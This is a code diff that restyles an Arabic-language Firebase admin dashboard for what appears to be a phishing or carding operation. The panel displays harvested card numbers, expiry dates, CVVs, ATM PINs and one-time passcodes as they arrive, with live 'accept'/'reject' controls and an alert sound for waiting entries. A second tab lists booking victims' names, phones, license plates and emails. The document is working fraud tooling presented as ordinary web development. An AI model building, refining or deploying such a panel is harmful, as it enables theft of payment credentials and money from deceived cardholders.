@@ -3,40 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - تسجيل دخول</title>
+    <title>لوحة التحكم - التصميم الفاتح</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #eee; margin: 0; padding: 0; }
-        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .nav-btn.active { background: white; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; }
+        /* تنسيق التصميم الفاتح */
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; color: #333; margin: 0; padding: 0; }
+        .navbar { background: #1e7344; padding: 12px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .nav-btn { background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .nav-btn.active { background: white; color: #1e7344; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
         
-        .container { padding: 15px; width: 100%; box-sizing: border-box; }
-        .tab-content { display: none; width: 100%; overflow-x: auto; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e0e0e0; }
+        
+        .container { padding: 20px; width: 100%; box-sizing: border-box; }
+        .tab-content { display: none; width: 100%; overflow-x: auto; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
         .tab-content.active { display: block; }
 
-        .data-table { width: 100%; border-collapse: collapse; min-width: 1200px; background: #161616; }
-        .data-table th { background: #222; color: #888; padding: 12px; text-align: right; font-size: 13px; border-bottom: 2px solid #333; }
-        .data-table td { padding: 12px; border-bottom: 1px solid #222; font-size: 14px; white-space: nowrap; }
+        /* تنسيق الجدول في الخلفية البيضاء */
+        .data-table { width: 100%; border-collapse: collapse; min-width: 1200px; background: white; }
+        .data-table th { background: #f8f9fa; color: #666; padding: 15px; text-align: right; font-size: 13px; border-bottom: 2px solid #eee; font-weight: 600; }
+        .data-table td { padding: 15px; border-bottom: 1px solid #f0f0f0; font-size: 14px; white-space: nowrap; color: #222; }
         
-        .ltr-fix { direction: ltr !important; unicode-bidi: bidi-override !important; display: inline-block; text-align: left !important; font-family: monospace; letter-spacing: 1px; }
+        .ltr-fix { direction: ltr !important; unicode-bidi: bidi-override !important; display: inline-block; text-align: left !important; font-family: 'Consolas', monospace; font-weight: bold; font-size: 15px; }
 
-        .is-new-row { background: #0d2112 !important; border-right: 5px solid #28a745 !important; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% { background: #0d2112; } 50% { background: #1b3d24; } 100% { background: #0d2112; } }
+        /* حالة التنبيه النشط (لون أخضر فاتح جداً) */
+        .is-active-row { background: #e8f5e9 !important; border-right: 6px solid #28a745 !important; animation: glow 1.5s infinite; }
+        @keyframes glow { 0% { background: #e8f5e9; } 50% { background: #c8e6c9; } 100% { background: #e8f5e9; } }
         
-        .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; background: #333; color: #666; }
-        .active-green { background: #28a745 !important; color: white !important; }
-        .active-red { background: #dc3545 !important; color: white !important; }
+        /* الأزرار */
+        .btn { padding: 8px 18px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; background: #e0e0e0; color: #888; transition: 0.3s; }
+        .btn-green.highlight { background: #28a745 !important; color: white !important; box-shadow: 0 3px 8px rgba(40,167,69,0.3); }
+        .btn-red.highlight { background: #dc3545 !important; color: white !important; box-shadow: 0 3px 8px rgba(220,53,69,0.3); }
 
-        /* شاشة الدخول المعدلة */
+        /* شاشة الدخول */
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .login-card { background: white; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 320px; }
-        .login-card h2 { color: #1e7344; margin: 0 0 20px 0; font-size: 22px; }
-        .login-card input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 16px; }
-        .login-card button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        .login-card button:hover { background: #145a34; }
+        .login-card { background: white; padding: 40px; border-radius: 20px; text-align: center; width: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body onload="checkSavedLogin()">
@@ -45,18 +46,19 @@
 
 <div id="loginOverlay">
     <div class="login-card">
-        <h2>تسجيل دخول</h2>
-        <input type="password" id="password" placeholder="كلمة المرور">
-        <button onclick="checkLogin()">دخول</button>
+        <h2 style="color: #1e7344; margin-bottom: 25px; font-size: 24px;">تسجيل دخول</h2>
+        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:14px; margin-bottom:20px; border:2px solid #eee; border-radius:10px; text-align:center; font-size: 16px; outline: none;">
+        <button onclick="checkLogin()" style="width:100%; padding:14px; background:#1e7344; color:white; border:none; border-radius:10px; cursor:pointer; font-weight:bold; font-size: 16px;">دخول آمن</button>
     </div>
 </div>
 
 <div id="adminContent" style="display:none;">
-    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">🌐 المتواجدون الآن في الموقع: <span id="onlineCount">0</span> زائر</div>
+    
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
-        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
-        <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
+        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجوزات</button>
+        <button class="nav-btn" onclick="logout()" style="background:#333">🚪 خروج</button>
     </div>
 
     <div class="container">
@@ -68,18 +70,28 @@
                         <th>رقم البطاقة</th>
                         <th>الانتهاء</th>
                         <th>CVV</th>
-                        <th>PIN (السري)</th>
-                        <th>OTP (الرمز)</th>
+                        <th>PIN السري</th>
+                        <th>OTP الرمز</th>
                         <th>الإجراء</th>
                     </tr>
                 </thead>
                 <tbody id="paymentsList"></tbody>
             </table>
         </div>
+
         <div id="bookingSection" class="tab-content">
             <table class="data-table">
                 <thead>
-                    <tr><th>الاسم</th><th>التليفون</th><th>السيارة</th><th>اللوحة</th><th>التاريخ</th><th>الوقت</th><th>الجيميل</th><th>البلد</th></tr>
+                    <tr>
+                        <th>الاسم</th>
+                        <th>التليفون</th>
+                        <th>السيارة</th>
+                        <th>اللوحة</th>
+                        <th>التاريخ</th>
+                        <th>الوقت</th>
+                        <th>الجيميل</th>
+                        <th>البلد</th>
+                    </tr>
                 </thead>
                 <tbody id="bookingList"></tbody>
             </table>
@@ -123,15 +135,14 @@
                 row.querySelector('.val-otp').innerText = val.otp || '-';
 
                 if(val.status && val.status.includes('waiting')) {
-                    row.classList.add('is-new-row');
-                    row.querySelector('.btn-green').classList.add('active-green');
-                    row.querySelector('.btn-red').classList.add('active-red');
+                    row.classList.add('is-active-row');
+                    row.querySelector('.btn-green').classList.add('highlight');
+                    row.querySelector('.btn-red').classList.add('highlight');
                     playSound();
-                }
-                if(val.status === 'accept' || val.status === 'reject') {
-                    row.classList.remove('is-new-row');
-                    row.querySelector('.btn-green').classList.remove('active-green');
-                    row.querySelector('.btn-red').classList.remove('active-red');
+                } else {
+                    row.classList.remove('is-active-row');
+                    row.querySelector('.btn-green').classList.remove('highlight');
+                    row.querySelector('.btn-red').classList.remove('highlight');
                 }
             }
         });
@@ -144,16 +155,21 @@
         if(document.getElementById('row_' + key)) return;
         const tr = document.createElement('tr');
         tr.id = 'row_' + key;
+        
+        const activeClass = (val.status && val.status.includes('waiting')) ? 'highlight' : '';
+        const rowClass = (val.status && val.status.includes('waiting')) ? 'is-active-row' : '';
+
+        tr.className = rowClass;
         tr.innerHTML = `
-            <td style="color:#28a745; font-weight:bold;">${val.cardHolder || 'عميل'}</td>
+            <td style="color:#1e7344; font-weight:bold;">${val.cardHolder || 'عميل'}</td>
             <td><span class="ltr-fix val-card">${val.cardNumber}</span></td>
             <td><span class="ltr-fix val-expiry">${val.expiry}</span></td>
-            <td><span class="ltr-fix val-cvv">${val.cvv}</span></td>
-            <td><span class="ltr-fix val-pin" style="color:#9c27b0; font-weight:bold;">${val.atm_pin || '-'}</span></td>
-            <td><span class="ltr-fix val-otp" style="color:#2196f3; font-weight:bold;">${val.otp || '-'}</span></td>
+            <td><span class="ltr-fix val-cvv" style="background:#eee; padding:2px 6px; border-radius:4px;">${val.cvv}</span></td>
+            <td><span class="ltr-fix val-pin" style="color:#9c27b0;">${val.atm_pin || '-'}</span></td>
+            <td><span class="ltr-fix val-otp" style="color:#2196f3;">${val.otp || '-'}</span></td>
             <td>
-                <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
-                <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
+                <button class="btn btn-green ${activeClass}" onclick="updateStat('${key}', 'accept')">قبول</button>
+                <button class="btn btn-red ${activeClass}" onclick="updateStat('${key}', 'reject')">رفض</button>
             </td>
         `;
         list.prepend(tr);
@@ -163,19 +179,21 @@
         const list = document.getElementById('bookingList');
         const tr = document.createElement('tr');
         tr.innerHTML = `
-            <td>${val.fullName || '-'}</td>
-            <td class="ltr-fix">${val.phone || '-'}</td>
+            <td style="font-weight:bold;">${val.fullName || '-'}</td>
+            <td class="ltr-fix" style="color:#444;">${val.phone || '-'}</td>
             <td>${val.vehicleType || '-'}</td>
             <td>${val.plateNumber || '-'}</td>
             <td>${val.bookingDate || '-'}</td>
             <td>${val.bookingTime || '-'}</td>
-            <td>${val.email || '-'}</td>
+            <td style="color:#666; font-size:12px;">${val.email || '-'}</td>
             <td>${val.country || '-'}</td>
         `;
         list.prepend(tr);
     }
 
-    function updateStat(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
+    function updateStat(id, action) { 
+        firebase.database().ref('payments/' + id).update({ status: action }); 
+    }
 
     function openTab(evt, name) {
         document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
